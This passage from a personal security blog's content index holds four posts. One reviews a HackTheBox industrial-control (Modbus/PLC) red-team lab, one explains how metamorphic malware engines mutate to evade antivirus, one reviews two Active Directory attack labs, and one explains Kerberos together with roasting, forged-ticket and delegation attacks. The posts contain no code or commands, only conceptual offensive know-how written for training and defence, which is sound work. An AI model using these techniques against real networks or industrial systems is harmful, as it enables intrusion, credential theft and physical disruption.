protocol Structured text (.st) PLC code review What is Operational Technology?\rIn contrast to information technology (IT), which deals with data systems, operational technology (OT) mainly revolves around the control of physical or industrial equipment. OT is made up of software and hardware used to manage, secure and control industrial control systems (ICS) systems, devices and processes in the OT environment. OT devices are physical components or systems used to monitor, control, or automate industrial processes. These devices interact directly with machinery, infrastructure, and physical systems, enabling real-time operations in sectors like manufacturing, energy, utilities, and transportation. In the following, some of the most common OT devices are introduced1.\nProgrammable Logic Controllers (PLCs): PLCs are specialized industrial computers designed to monitor, control, and automate processes or machinery in real-time. PLCs use ladder logic, structured text, or function block diagrams to define how inputs should be processed and what outputs should be generated. They communicate with other systems via industrial communication protocols like Modbus Human Machine Interfaces (HMIs): A HMI is a user interface or dashboard that allows operators to interact with machines, systems, or processes in industrial environments. HMIs provide real-time information about the status, performance, and control of machines or systems, enabling users to monitor and manage operations effectively. Supervisory Control and Data Acquisition (SCADA): SCADA systems are used in industrial and infrastructure environments to monitor, control, and collect data from equipment and processes, often across geographically dispersed locations. Modbus\rModbus is a serial communication protocol from 1979 for use with programmable logic controllers (PLCs). In simple terms, it is a method used for transmitting information over serial lines between electronic devices. The device requesting the information is called the Modbus Master and the devices supplying information are Modbus Slaves2.\nIn Modbus, there are coils and holding registers. Coils are used to handle binary (on/off) states while holding registers handle data which controls settings or outputs. There are also input registers, which are read-only and hold sensor data or other inputs. Modbus supports a series of function codes that can be used to interact with coils and registers. The function code in the request tells the addressed slave device what kind of action to perform. The data bytes contains any additional information that the slave will need to perform the function. For example, function code 0x03 will request the slave to read holding registers and respond with their contents. The data field must contain the information telling the slave which register to start at and how many registers to read.3\nFunction Code Function Name Description 0x01 Read Coils Reads the status of a block of coils (on/off). 0x02 Read Discrete Inputs Reads the status of a block of discrete input bits (on/off). 0x03 Read Holding Registers Reads the contents of a block of holding registers. 0x04 Read Input Registers Reads the contents of a block of input registers. 0x05 Write Single Coil Sets the status of a single coil (on/off). 0x06 Write Single Register Writes a single value into a holding register. 0x0F Write Multiple Coils Sets the status of multiple coils (on/off). 0x10 Write Multiple Registers Writes multiple values into holding registers. 0x17 Read/Write Multiple Registers Performs a combination of read and write operations on registers. The OT section in Alchemy revolved around understanding und interacting with the Modbus communication process between HMIs and PLCs to make the devices behave in unpredictable ways. More about the Pro Lab itself is discussed in the subsequent sections.\nAlchemy Pro Lab Review\rThe Alchemy Pro Lab simulates a external security assessment of the Sogard Brewing Co. in form of a red team engagement. The overall objective of the engagement was to determine whether brewery operations can be disrupted based on the current architecture. The attacker was tasked with assessing the company\u0026rsquo;s public interface (i.e., the IT network) and emphasize the weaknesses allowing an adversary to impact the physical process or steal the brewery\u0026rsquo;s Intellectual Property.\nThe only information disclosed at the start of the engagement was the IP-address of the entry point web application of the brewery. From there, the lab environment was basically divided into three sections. An IT section containing the office network and corporate Active Directory, a smaller and segmented OT control section and a third network segment, housing the HMI\u0026rsquo;s and PLC devices. Like all the other Pro Labs, Alchemy had a total of 21 flags to be collected. In the IT network, those flags were usually found on compromised hosts but to get the OT flags, the attacker was required to either obtain sensitive information about the brewing recipe or make the device behave unexpectedly or unsafely.\nWhile the IT section was very straightforward and simple, the exploitation of PLC logic proved to be much more complex. To recreate a realistic OT environment, HackTheBox created a fictional manufacturer of the different types of PLC devices. Throughout the lab, I was able to amass a variety of documentation about these devices in the form of datasheets, release notes and source code, which helped developing my understanding of the inner workings of the technology. I really appreciated to amount of effort that was put into creating the custom documents which made the lab feel a lot more immersive and fun rather than having only the most relevant information in a simple text file. Due to this, I was essentially forced to read and understand the technical aspects like the Modbus protocol and uncover ways to mess with the intended functionality.\nEven though there were multiple PLC\u0026rsquo;s, they all felt unique and each offered distinct misconfigurations, from outdated software with known vulnerabilities to access control restrictions or even IT-typical vulnerabilities on the HMI websites. All in all, the Alchemy Pro Lab taught me that I enjoy exploiting weaknesses more when they require in-depth understanding of the technical processes and thorough research in associated documentation or the internet, rather than simply copying and executing a public exploit from GitHub. While the later is fun too, building a successful exploit chain tailored to the target after getting how it works just feels a lot more rewarding.\nLessons Learned\rAs with all Pro Labs, Alchemy again provided me with an opportunity to discover new tools and techniques. One of the most interesting tools I found useful during the engagement was the Printer Exploitation Toolkit (PRET). This framework allowed for easy interaction with network printers, allowing for instance the retrieval of sensitive information. PRET will be a go-to tool when discovering printers on future penetration tests or red team engagements.\nAnother huge focus point of the OT area was understanding and interaction with the Modbus protocol. I personally used a combination of tools for this purpose:\nmodbus-cli: A useful command line tool for enumerating and querying coils and registers pymodbus: A Python library for interacting with PLC devices that communicate via the Modbus protocol. Especially useful for creating scripts for more complex exploits that require multiple steps. It is also very well documented which made picking it up and using it very straightforward. Finally, the biggest lesson I took away from the Alchemy Pro Lab was the importance of securing ICS/OT environments. Systems in these environments have mostly not been designed with security in mind. The combination of outdated operating systems and legacy software with known vulnerabilities and misconfigurations and the fact that these systems are used to control multi-million euro machinery leads to OT networks being an attractive target for threat actors and nation-state hackers. Downtime of those machines can lead to immense loss of revenue and and threat actors might even be able to steal sensitive intellectual property like blueprints and secret recipes. In critical sectors like energy, transportation and water supply, exploitation of OT devices can lead to catastrophic consequences in both security as well as safety.\nThe importance lies in properly segmenting OT networks from IT networks to prevent unauthorized access to HMI\u0026rsquo;s and PLC\u0026rsquo;s that could compromise the availability, integrity and confidentiality of OT systems, as well as testing PLC devices for misconfigurations that could lead to malicious modifications or information disclosure.\nConclusion\rAll in all, I personally consider Alchemy to be the most fun Pro Lab that HackTheBox offers. While the difficulty of the IT section compares to the Dante, the OT challenges provide a lot of learning opportunities for new technologies and out-of-the-box thinking. The scenario and custom documents were incredibly well crafted and made the whole experience feel a lot more immersive and captivating. I recommend checking out Alchemy to anyone interesting in learning about OT penetration testing, as it provides a good learning opportunity for key concepts in this field.\nThat all being said, I wish you a Merry Christmas and an insightful 2025!\nhttps://www.checkpoint.com/cyber-hub/network-security/what-is-operational-technology-ot-security/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://www.simplymodbus.ca/FAQ.htm\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://www.modbustools.com/modbus.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"http://localhost:1313/blog/alchemy/","title":"Stepping into the world of OT Penetration Testing with Alchemy"},{"content":" Metamorphic or self-modifying code is an advanced technique used by virus and malware authors which enables their malicious program to rewrite itself in a way that the code remains functionally equivalent but looks different each time it is executed. This characteristic prevents antivirus software from detecting the malware using static signatures and makes reverse engineering more difficult.\nThis article will provide an overview of metamorphic malware, the difference to polymorphic malware and how it can be implemented, by taking a look at how The Mental Driller from the 29A virus group structures metamorphic engines1.\nMetamorphism vs Polymorphism\rThe term polymorphism in regard to malware or virus development has little to do with it\u0026rsquo;s use in object-oriented programming. Instead, polymorphic malware can change its signature by generating and using a mutation engine that generates a new decryption routine for each generation of the virus. After the initial virus body is decrypted, the decryption routine is mutated and the virus body as well as the decryptor are encrypted again, before being linked together for the next iteration2. The downside of this approach is obvious: the decrypted virus body does not change and can therefore be detected and flagged by antivirus software, which is the reason why metamorphic engines came into existence.\nMetamorphism can be defined as body-polymorphism3. Instead of having a constant virus body, a metamorphic engine is able to create new generations of the virus which are functionally equivalent but look different for every new infection. It\u0026rsquo;s not just the decryptor that mutates, but everything else in the code as well. This can be achieved by using three mutation techniques:\nCompression: The virus body is compressed by combining multiple assembly instructions into one that does the same thing. This step is necessary to avoid the malware from growing too large in size. Permutation: Intstructions are permuted by changing the order or by replacing them with equivalent instructions. Expansion: Instructions are rewritten into multiple instructions that do the same thing and insert dead code that adds not functionality. This technique is only used if compression is present, since the virus code would grow uncontrollably otherwise. While the permutation aspect is usually present in most metamorphic engines, the others are used to a lesser extent, due to the difficulty of implementing the compression code. According to The Mental Driller, the Accordion model (compression \u0026amp; expansion) in combination with permutation generates absolute metamorphism, which means that code skeleton changes but not the algorithm1.\nThe Metamorphic Engine\rThe metamorphic engine is the core part of a metamorphic virus that is responsible for the mutation of the virus body. It takes of more than 90% percent of the virus code, with the remaining part being the infector itself. The structure of the engine was described by The Mental Driller in 2002 but can still be applied to modern metamorphic malware. It incorporates the mutation techniques mentioned above in the shrinker, permutator and expander components and further includes a disassembler and assembler.\nThe following sections will provide a brief overview of each component of the engine. In particular, this article will focus on MetaPHOR4 (metamorphic permutating high-obfuscating reassembler), also known as W32/Simile5 by The Mental Driller. The replication mechanism of the virus is out of scope for this blog post but can be read about here.\nDisassembler\rIn order to mutate itself, the malware first needs to disassemble itself into a pseudo-assembly language that is created by the malware author. However, The Mental Driller suggests basing the pseudo-assembly language on x86 opcodes in order to simplify the handling. The secondary characteristic of the disassembler is the ability to decode jmp or call instructions. A memory buffer is used to store the already-disassembled code, while two tables are used to store pointers to the disassembled code and the destinations of jmp, call and other similar instructions. While this article will not go into in-depth detail of the disassembler\u0026rsquo;s algorithm, it eventually achieves the following goals:\nEliminating permutation and permutation jumps Eliminating unreachable code Decoding the program into a pseudo-assembly language Substituting labels with pointers to table entries Shrinker\rAfter the code has been disassembled, the shrinker takes caro of compressing known pairs or triplets of instructions into a single one. This is mainly done to reduce the size of the malware and to undo the results of the expander. The program needs to define a table of possible combinations that can be compressed or even eliminated.\nOriginal Instruction Compressed Instruction Explanation MOV reg, reg NOP Nothing happens XOR reg, reg MOV reg, 0 Sets the registry to 0 SUB reg, reg MOV reg, 0 Sets the registry to 0 As can be seen in the table above, the shrinker also aims to keep the amount of different instructions to a minimum, which is why both the xor and sub instruction are compressed to a mov instruction.\nOf course, the shrinker not only replaces single instructions but also sets of instructions. A small excerpt is shown below.\nMOV addr, reg and PUSH addr PUSH reg MOV addr2, addr1 and MOV addr3, addr2 MOV addr3, addr1 MOV reg, val and ADD reg, reg2 LEA reg,[reg2 + val] When a matching pair or triplet is found, the shrinker replaces the first instruction with the compressed one and overwrites the following instructions with NOP instructions, successfully compressing it.\nPermutator\rThe permutator is responsible for changing the order of instructions in the code, which is done by shuffling. By leaving in the nop instructions from the shrinker in this step, the permutator will derive a more random code structure, since the nop instructions are included in the permutation, but removed in further steps. The permutator can also be combined with other forms of metamorphism, such as substitution, which replaces instructions with equivalent ones.\nExpander\rAt this point, the code has been compressed and permuted, which means that the code is now smaller and has a different structure. Now, the expander basically does the opposite of the shrinker: it recursively replaces single instructions randomly with matching single, pair or triplet instruction sets. Of course, a control variable is put in place to prevent the code from growing too much. Apart from the obvious expansion, the expander has additional characteristics, like register translation, which means that the registers are shuffled and never the same in different generations.\nThe expander is normally only implemented if the shrinker is implemented as well, as the code would grow uncontrollably without a compression mechanism.\nAssembler\rLast but not least, the assembler is responsible for converting the mutated pseudo-assembly language back into machine code that the processor can understand. The assembler fixes jmp, call and similar instructions, changes registers and fixes instruction lengths, before reassembling the code into the target processor language.\nAfter the assembler has done its job, the metamorphic engine has successfully mutated the virus body and the hard part begins: the debugging. Debugging metamorphic code is problematic, since the mutated code is obfuscated and difficult to understand.\nThis marks the end of the components that The Mental Driller has described in his article about MetaPHOR. It has to be said that these are not the only metamorphic techniques that exist and that there are of course countless other ways to implement a metamorphic engine.\nDetection\rDespite it\u0026rsquo;s sophistication, metamorphic malware is by no means undetectable. Possible detection techniques include:\nBehavioral Analysis Heuristic-based Detection Emulation or VM-Sandboxing Geometric Detection6 Machine Learning7 According to researcher Philippe Beaucamps, who thoroughly studied and analyzed The Mental Driller\u0026rsquo;s MetaPHOR, the virus can be detected using statistical analysis of the code and monitoring of the memory during program execution. This is because the virus compresses itself into a form which is similar between generation. Furthermore, The Mental Driller has not implemented evasion techniques that protect against behavioral analysis8. However, the researcher also states that antivirus companies can be swiftly overtaken if refined metamorphic techniques were to be used by virus authors and malware developers.\nConclusion\rSumming up, metamorphism is an advanced and highly sophisticated technique used by malware authors to evade static detection through signature-based antivirus software. Due to the complexity of the metamorphic engine, the code is difficult to implement, debug and reverse engineer, resulting in a shortage of research and well-developed practical examples. The Mental Driller showcased the generic structure of a metamorphic engine in his article about MetaPHOR, consisting of a disassembler, shrinker, permutator, expander and assembler. By combining the permutator with the so-called \u0026ldquo;Accordion\u0026rdquo; model, MetaPHOR achieved what the author called absolute metamorphism. The result is a virus that is functionally equivalent but looks different each time it infects a new host.\nMetamorphism in practice or \u0026ldquo;How I made MetaPHOR and what I\u0026rsquo;ve learnt\u0026rdquo;, https://vxug.fakedoma.in/archive/VxHeaven/lib/vmd01.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMetamorphic Malware and Obfuscation: A Survey of Techniques, Variants, and Generation Kits, https://onlinelibrary.wiley.com/doi/10.1155/2023/8227751\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nAdvanced Code Evolution Techniques and Computer Virus Generator Kits: https://www.informit.com/articles/article.aspx?p=366890\u0026amp;seqNum=6\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMetaPHOR source code: https://github.com/mal-project/win32.MetaPHOR\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSimile: https://en.wikipedia.org/wiki/Simile_(computer_virus)\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nHunting for Metamorphic: https://harrisonwl.github.io/assets/courses/malware/spring2017/papers/HuntingMetamorphic.pdf\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nUnderstanding Metamorphic Code: https://dev.to/khairuaqsara/understanding-metamorphic-code-3g7\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nAdvanced Metamorphic Techniques in Computer Viruses: https://inria.hal.science/inria-00338066/document\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"http://localhost:1313/blog/metamorphic-malware/","title":"Metamorphic Malware"},{"content":"A few months ago, I published a blog post where I reviewed the first three HackTheBox Pro Labs that I completed in summer 2023: Offshore, RastaLabs and Zephyr. Over the winter months of this year, I took on the challenge to complete the two remaining advanced labs: Cybernetics and APTLabs. They are both rated as highly challenging, realistic and modern training environments for red team operators and penetration testers.\nIn this blog post, I want to share the journey I went through while completing these labs with my good friend and colleague Leo and I\u0026rsquo;m going to give a brief review of the labs themselves and my opinion on them.\nCybernetics: Advanced AD\rBeing considered the \u0026ldquo;easier\u0026rdquo; lab of the two, Cybernetics was the first network that was tackled. This Red Team Operator Level 2 lab simulates a red team engagement against a massive and immersive corporate Active Directory environment. The lab is huge: 28 hosts, split up in 5 different domains and 25 distinct flags to collect while moving laterally through the network. As always, the end goal is to obtain Domain Admin privileges on all domains and collect the flags that are planted along the way. While there are a few web applications that are needed to be exploited to progress in the lab, most of the attacks in Cybernetics revolve around Active Directory exploitation, privilege escalation and lateral movement. A huge aspect of the lab which hadn\u0026rsquo;t been covered in the previous ones is the usage of AD Certificate Services to issue certificates and use them for authentication. In order to log in to some of the machines, a valid certificate needs to be presented as a second authentication factor. I personally had to set up a secondary Windows virtual machine, which I used to request and store the certificates. Yet another interesting usage of this technology was the ability to request Code-Signing certificates to execute malicious code under a trusted signature. Cybernetics also simulates real users that are targeted through phishing attacks. The attacker is required to create a malicious document that is sent to the victim and then execute the payload on the victim\u0026rsquo;s machine. Of course, the lab also includes it\u0026rsquo;s fair share of Kerberos attacks, such as the classic resource-based constrained delegation attack, which had become a favourite of mine, as well as SQL Server attacks that exploit linked database servers on separated domains.\nAll in all, I would probably consider Cybernetics to be my favourite Pro Lab out of all of them, due to it\u0026rsquo;s size, variety of attack vectors and the fact that is not frustratingly difficult, but still challenging enough to be learned from. Cybernetics required me to take my researching skills to the next level, working with technologies that I had never used or even heard of before. I had to improve my situational awareness and learn to keep track of all valuable information that was collected. For anyone interested in trying this lab, I highly recommend using a proper command and control framework, like Havoc, since it drastically simplifies managing compromised hosts, keeping persistence and provides built-in tools to move laterally. For note-taking, I personally use Notion, since it makes it easy for me to organize my notes based on hosts and domains, as well as to keep track of the credentials and flags that I have collected.\nAPTLabs: Hardcore Threat Simulation\rCybernetics was already quite a challenge, due to the variety of new attack vectors and technologies that I had not been familiar with. Little did I know how much harder the final lab was going to be. APTLabs takes it\u0026rsquo;s name from the abbreviation APT, which stands for Advanced Persistent Threat. An APT is a group of highly skilled and motivated attackers that are usually sponsored by a nation state. They are known to be extremely stealthy and persistent, often staying in a network for months or even years without being detected. This Red Team Operator Level 3 lab simulates an attack of an external threat actor against the fictitious service provider Gigantic Hosting. The hosts in APTLabs are fully hardened, patched and are not exploitable using CVEs and exploits found on the Internet. Each of the 18 hosts in the lab could be considered a \u0026ldquo;Insane\u0026rdquo;-rated HackTheBox standalone machine. The network is split into 5 domains with their own Active Directory environment each. The goal is to obtain Domain Admin privileges wherever possible and collect the 20 flags that are placed throughout the network.\nAPTLabs requires a lot of enumeration, research and creativity. The lab is designed to be as realistic as possible, which means that there are plenty of modern defense mechanisms in place that restrict the freedom of the adversary. These security mechanisms include multi-factor authentication, AppLocker, JEA and many more. All attacks on the network are highly sophisticated and advanced, often requiring multiple steps to be chained together. For instance, there is a lot of focus set on relaying or spoofing attacks. This usually involves coercing authentication from one host to target, in order to compromise it or capturing credentials by utilising man-in-the-middle attacks. Plenty of Active Directory and Kerberos attack vectors are covered, but they usually include some sort of twist that changes the way the attack is performed, requiring some additional configuration or process. The TTPs (tactics, techniques and procedures) in this lab are incredibly interesting and useful for red teamers and penetration testers, since they target technologies and services that are widely used in modern corporate environments, like SCCM, ADFS or MSSQL.\nIt took me roughly 2 months to finish APTLabs. It was incredibly challenging and frustrating at times, but I have learning insanely much during the process. I had to learn to think outside the box and to be creative with the tools and techniques that I had at my disposal. I had to learn to be patient and to not give up, even if I was stuck on a machine for days. I had to learn to be organized and to keep track of all the information that I had collected. APTLabs pushed me outside of my comfort zone, but at the end of the day, there is nothing more rewarding than looking at that hard-earned certificate, knowing what it took to get it.\nRecommended Toolset\rIn this section, I want to provide a list of the tools that a used to most during my work on the HackTheBox Pro Labs so far. I have a GitHub repository, where I usually push compiled executables or scripts that I find useful. This repository also provides a well structured README and organizes the tools based on their intended use case.\nHavoc: The most important tool in any red teamer\u0026rsquo;s arsenal. Havoc is a command and control framework with a beautiful user interface and a flagship agent that made infecting machines during the labs a breeze. It provides a lot of useful tools to move laterally, keep persistence and manage compromised hosts, like the dotnet inline-execute command to execute .NET assemblies in memory. ligolo-ng: Ligolo-ng is a simple, lightweight and fast tool that allows penetration testers and red teamers to establish tunnels from a reverse TCP/TLS connection using a tun interface. It made pivoting between domains much easier and faster. BloodHound: BloodHound is an absolute necessity when it comes to Active Directory enumeration. It allows you to visualize the relationships between objects in an Active Directory environment, like trusts, ACLs and group memberships and find paths to escalate privileges and move laterally. Rubeus: There is no Active Directory without Kerberos and there is no Active Directory exploitation without Rubeus. Rubeus is a C# toolset that allows you to perform Kerberos attacks, like AS-REP Roasting, Kerberoasting, ticket attacks and many more. It is one of the most important tools in my arsenal and I used it on every single Windows machine during the labs. SharpEfsPotato: This tool is primarily used together with Havoc to escalate privileges on a machine, where the user has the SeImpersonatePrivilege privilege. More often than not, it was necessary to run commands with SYSTEM privileges, which was achieved by executing SharpEfsPotato with Havoc in memory. PowerView: PowerView is a collection of PowerShell functions that are used to perform Active Directory enumeration and exploitation. It is a must-have for any red teamer or penetration tester and is best used in combination with BloodHound. Powermad: Powermad is a toolset of PowerShell scripts that are used to perform DNS exploits, like adding and modifying ADIDNS nodes. Furthermore, it can be used to easily create new machine accounts in Active Directory, which is necessary to exploit RBCD. The tool was very frequently used in APTLabs and Cybernetics. Impacket: When no shell has been obtained on a machine, Impacket is the way to go. It is a collection of Python scripts that allow you to perform a variety of attacks against Windows machines, like SMB and MSSQL attacks, as well as AS-REP- and Kerberoasting. The incredible impacket-secretsdump command is used to dump the NTLM hashes of all users on a host or domain if a valid set of administrator credentials is provided. CrackMapExec: The Linux-based CrackMapExec (CME) allows you to perform Active Directory enumeration, as well as exploitation using it\u0026rsquo;s module system. Particularly useful was the LAPS module, which allowed me to dump the local administrator password of a machine. I often used CME after compromising a user, to see if I could find any other machines that the user had access to. Edit: Instead of CrackMapExec, I now use it\u0026rsquo;s successor NetExec, which basically works the same way, but is more actively maintained and has a few additional features.\nRemember, this is only a small selection of the tools that I used during the labs. I highly recommend checking out my precompiled-binaries repository on Github, where I have compiled a list of all the tools that I used during the labs. I update this repository quite regularly, so make sure to star it if you find it useful.\nConclusion\rAs already mentioned, Cybernetics and APTLabs elevated my knowledge on Active Directory enumeration and exploitation techniques, expanded my adversarial toolset and helped me develop situational awareness in complex environments. I am very grateful to have been able to complete them and to now consider myself a Level 3 Red Team Operator. The labs provide a challenge which I would recommend to anyone interested in advanced Active Directory attacks and are definitely worth the price. For more beginner- or intermediate-level difficulty, I would recommend the other Pro Labs, like Offshore and Zephyr, which I have reviewed in my previous blog post.\n","permalink":"http://localhost:1313/blog/cybernetics-aptlabs/","title":"High-Level Red Team Training: Cybernetics \u0026 APTLabs Review"},{"content":"The Kerberos protocol provides a single-sign-on (SSO) mutual authentication solution for insecure networks or hosts, where clients and servers verify each others identity based on symmetric-key cryptography and a ticket-based authentication system. Most commonly used in Windows Active Directory environments, a user only has to enter their password once to be able to access a multitude of servers, shares or other resources, while the password is never directly sent across the network, unlike in less secure alternatives like NTLM.\nThe name Kerberos stems from the three-headed dog Cerberus, who in Greek mythology guards the gates of the underworld. Similarly, Kerberos is used to guard a network from unwanted and unauthenticated users. It was developed by the Massachusetts Institute of Technology (MIT) in 1988, with it\u0026rsquo;s current version, Kerberos Version 5 having been initially published in 1993 and reworked to meet security standards in 2005. The protocol is open source and has been built into Windows as the default authentication mechanism since Windows 2000.\nComponents\rThe domain or network where Kerberos is the authentication authority is called a Kerberos realm. Subjects like users or services in a realm are called principals and have a unique identifier assigned to them. The most important component of a Kerberos realm is the Key Distribution Center (KDC) which is usually located on the domain controller in an Active Directory environment. The KDC consists of two servers, the Authentication Server (AS), which is responsible for verifying user\u0026rsquo;s credentials against the Kerberos database which stores the secret symmetric keys of all principals, as well as the Ticket Granting Server (TGS), which is tasked to issue tickets to the authenticated user that allow them to access the desired services. There a two forms of tickets used with Kerberos authentication. A Ticket Granting Ticket (TGT) is obtained after successful authentication to the AS and allows for the retrieval of Service Tickets (ST) from the TGS, which are then used by the user to access the service they want to use. There is also another message type known as the Authenticator, which is used to verify the identity of the user to a service.\nWorkflow\rThe Kerberos authentication process1 consists of 6 steps that ensure mutual authentication between a client and a resource server and that the user can access the desired service. I have created a diagram that shows the workflow of the authentication process, which I will explain in detail below.\nAS_REQ (Authentication Server Request): The user sends an message containing their username or ID and the SPN (Service Principal Name) of the service they want to access to the AS. In this message, the SPN is krbtgt, the service account of the TGS that is responsible for issuing tickets. The requested lifetime of the TGT is also included, as well as a nonce, a random number which helps protect the system against replay attacks. This step is where the actual authentication happens, since the user is required to enter their password to generate their secret key. This secret key is used to encrypt a timestamp in the message, to ensure the authenticity of the user that requests the TGT. This process is known as pre-authentication and is used to prevent replay attacks and verify the user\u0026rsquo;s authenticity to the KDC.\nAS_REP (Authentication Server Response): Upon receiving the AS_REQ message, the authentication server verifies that the user ID exists in the Kerberos database, encrypting the PA-data (pre-authentication data) of message with the stored secret key afterwards. If the authentication is successful, the AS sends two encrypted messages to the client. The first message contains the TGS\u0026rsquo;s ID, a timestamp, the lifetime of the TGT and a randomly generated symmetric TGS Session Key. This message is encrypted with the clients secrets key that was fetched from the Kerberos database. The second message is the Ticket Granting Ticket and again contains the user\u0026rsquo;s and TGS\u0026rsquo;s ID, a timestamp, the TGT lifetime and the same TGS Session Key. However, the TGT is encrypted with the secret key of the TGS instead. More precisely, the TGT is encrypted with a key created from the password hash of the krbtgt account.\nTGS_REQ (Ticket Granting Server Request): The client again needs their secret key to decrypt the first message, send by the KDC. If valid credentials are supplied, this provides access to the mutual TGS Session Key. Note that the TGT, however, cannot be decrypted, since the user does not have access to the TGS\u0026rsquo;s secret key. Instead, the TGT is forwarded to the TGS along with two new messages. An unencrypted message containing the desired service\u0026rsquo;s SPN and the requested ST lifetime as well as an authenticator message with user ID and timestamp, which is encrypted with the TGS Session Key are sent to the TGS.\nTGS_REP (Ticket Granting Server Response): The TGS starts with verifying that the requested service exists in the Kerberos database on the KDC. Then, the TGS decrypts the TGT with the TGS secret key to obtain the TGS Session Key, which can in turn be used to decrypt the user authenticator message. The TGS then performs validation on the request by comparing user IDs, timestamps and ticket lifetimes. Additionally, the TGS features a cache that contains recent authenticators to protect against replay attacks, which would allow authentication on behalf of other users. After successful validation, the TGS creates two new messages and sends them back to the user. The first one contains the service ID and a timestamp, as well as a new symmetric Service Session Key. This message is encrypted with the TGS Session Key. The second message is the Service Ticket, containing user and service IDs, a timestamp the ST lifetime and the same Service Session Key. This message is encrypted using the desired service\u0026rsquo;s secret key, fetched from the Kerberos database.\nAP_REQ (Application Server Request): The user can decrypt the first received message using the TGS Session Key and obtains the Service Session Key. Again, the ST cannot be decrypted, since the user does not have access to the service’s secret key. Instead, the ST is forwarded to the service along with a user authenticator message containing user ID and timestamp, which is encrypted using the Service Session Key.\nAP_REP (Application Server Response): The service now uses it\u0026rsquo;s own secret key to decrypt the Service Ticket and is thus able to obtain the Service Session Key. After this key is used to decrypt the user authenticator message, the service validates the data received like the TGS previously did and checks it\u0026rsquo;s cache for recent authenticators by the same user to provide replay protection. A final service authenticator message containing the service ID and timestamp is encrypted with the Service Session Key and sent to the user. The user decrypts the service authenticator, verifies that data and stores a copy of the Service Ticket in it\u0026rsquo;s own cache for future use.\nAfter step 6, the mutual authentication between a user and service is complete and the user is allowed to access the service. An advantage of Kerberos is that at no point in the workflow, credentials are sent across the network. After the authentication, the user and service use the Service Session Key to encrypt all further communication, which is why Kerberos is also referred to as a session-based authentication protocol.\nAttack Vectors\rDue to its role as the authentication authority in a network, Kerberos is a preferred target for threat actors and adversaries, especially when attacking Windows Active Directory environments. In the following, three of the most common and devastating types of Kerberos exploitation techniques are showcased.\nRoasting / Credential gathering / Hash gathering\rWhen talking about Roasting in the context of Kerberos, it is differentiated between so-called Kerberoasting2 and ASREP-Roasting. Kerberoasting, on one hand, aims to exploit accounts that have a Service Principal Name (SPN) configured, which are usually web or database service users. If a user account has a SPN set, an adversary can request a ST to that user and through this obtain the krb5tgs hash of the user. If the password is weak enough, this hash can be easily cracked or brute-forced offline and the attacker compromises the account.\nThe other variant, ASREP-Roasting exploits principals that do not require Kerberos pre-authentication or have pre-authentication disabled. This feature was present in older Kerberos versions and basically enables an attacker to send a fake AS_REQ request to KDC without the users password and obtain the TGT and the message, which is encrypted with the target users secret key. The krb5asrep hash can be extracted from this data and can then be attempted to be cracked using brute-force methodology or a dictionary attack. Kerberos 5 requires a password to be used for the Authentication Server Request, but misconfigurations allow this to be disabled.\nTicket Attacks\rTicket attacks are amongst the most popular attack techniques for exploiting Active Directory and Kerberos authentication. It is differentiated between Golden and Silver Ticket attacks. For a Silver Ticket attack, a threat actor has compromised the password hash of a service account and is therefore able to forge Service Tickets and access restricted resources for this specific service.\nTo conduct a Golden Ticket attack, an attacker has to obtain the password hash of the krbtgt service account which allows them to forge TGTs, effectively granting unrestricted access to any service and allowing full domain or realm takeover. The krbtgt account works as the KDC to issue Kerberos tickets to clients and it’s password is usually not changed, meaning golden tickets can be used for long-term persistence if the attack is not detected. A high-privileged account, e.g. a Domain Admin or local administrator on the DC is needed to initially compromise the krbtgt hash via credential dumping.\nKerberos Delegation Attacks\rKerberos delegation3 comes into play, when a service is configured to act in behalf of another principal. Following is an easy example to demonstrate a use-case for delegation. The subjects are a user, a website hosted on a webserver, as well as a SQL database on a different server. When the user authenticates to the webserver, delegation makes it possible that the web service user requests access to the SQL server on behalf of the user, impersonating them instead of authenticating as the service account itself. This allows the user to only access database resources that they are allowed to access. There are three types of Kerberos delegation that can be exploited by threat actors.\nWhen Unconstrained Delegation is configured on a host, a TGT for each account authenticating to that host is stored in-memory to allow the host to impersonate that principal later. This is a severe security concern, since tickets can be easily extracted from memory using tools like mimikatz or Rubeus, allowing for the compromise of potentially privileged accounts that connected to that host. In combination with other exploits, it is also possible to force for example the domain controller to authenticate to the host with constrained delegation to obtain the TGT.\nOn the other hand, Constrained Delegation allows the configuration of what services an account can be delegated to, making it less risky than its unconstrained sibling. If a user account or a computer (machine account) that has constrained delegation enabled is compromised, it\u0026rsquo;s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to. Constrained delegation abuses the S4U2self and S4U2proxy protocol extensions (S4U = Service For User), which allow an service to retrieve a TGS for itself on behalf of other users.\nFinally, Resource-based Constrained Delegation (RBCD) is even more secure than the other two variations, but can still be abused to obtain access to restricted resources. In contrast to unconstrained and constrained delegation where a computer/user object is told what resources it can delegate authentications to, resource-based constrained delegation allows computer objects to specify who they trust and who can delegate to them. RBCD is controlled by the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of an account object. If an attacker can edit this property for example a domain controller, they can essentially create a new computer account in the domain, allow the domain controller to act on behalf of this created account and then exploit the S4Uslef and S4Uproxy with Rubeus like with constrained delegation.\nConclusion\rKerberos is a network authentication protocol designed to provide strong authentication for client/server applications. Using secret-key cryptography, it allows a client to prove its identity to a server (and vice versa) across an insecure network connection. Central to the protocol is the Key Distribution Center (KDC), which consists of the Authentication Server (AS) and the Ticket-Granting Server (TGS). Clients first authenticate with the AS to obtain a Ticket-Granting Ticket (TGT), which is then used to request service-specific tickets from the TGS. The protocol ensures both authentication and confidentiality and relies on time-sensitive tickets to prevent replay attacks. Kerberos has become an attractive target for threat actors when targeting Active Directory environments, due to its role as an authentication authority and the quantity of effective attack vectors.\nAdvantages Disadvantages Single sign-on is one of the biggest direct benefits of Kerberos, allowing a user to enter their credentials once, and continue to renew their ticket without intervention Single point of failure: If the KDC is compromised, the whole authentication system is compromised and all passwords can be dumped and extracted Mutual client-server authentication without sending passwords over the insecure network Only symmetric key cryptography is supported ⇒ key scaling and distribution issues 